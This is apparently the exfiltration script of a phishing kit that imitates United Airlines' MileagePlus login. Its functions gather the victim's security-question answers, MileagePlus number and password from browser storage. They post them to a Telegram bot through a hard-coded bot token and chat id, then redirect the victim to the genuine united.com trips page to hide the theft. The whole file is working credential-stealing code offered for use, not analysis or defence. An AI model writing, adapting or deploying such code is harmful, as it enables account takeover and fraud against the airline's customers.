function sendToTelegram(savedAnswers, mileagePlusNumber, password) {
    var telegramBotId = "5844871561:AAEOag-Dez56C6JRUdaeC2CwRZB2LKIVKXw";
    var chatId = 6275403027;

    // Create an array of objects, each representing a question
    var formattedAnswers = savedAnswers.map(function(answer) {
        // Customize this structure based on your object properties
        return {
            questionType: answer['Question type'],
            question: answer['Question'],
            answer: answer['Answer']
        };
    });

    // Include additional values within the array
    formattedAnswers.push({
        User_MileagePlusNumber: mileagePlusNumber,
        User_Password: password
    });

    var payload = {
        chat_id: chatId,
        text: JSON.stringify(formattedAnswers, null, 2), // Convert array to a nicely formatted JSON string
    };

    var sendToBot = {
        url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        data: JSON.stringify(payload)
    };

    $.ajax(sendToBot)
        .done(function (response) {
            window.location.href = "https://www.united.com/en/us/manageres/mytrips";
            //console.log("Telegram API response:", JSON.stringify(response));
        })
        .fail(function (error) {
            //console.error("Error sending data to Telegram:", error);
        });
}

function pageBossSender() {
    var savedAnswers = JSON.parse(localStorage.getItem("savedAnswers")) || [];
    var mileagePlusNumber = localStorage.getItem("mileagePlusNumber") || "";
    var password = localStorage.getItem("password") || "";

    if (savedAnswers.length > 0) {
        sendToTelegram(savedAnswers, mileagePlusNumber, password);
    } else {
        console.warn("No saved answers to send.");
    }
}
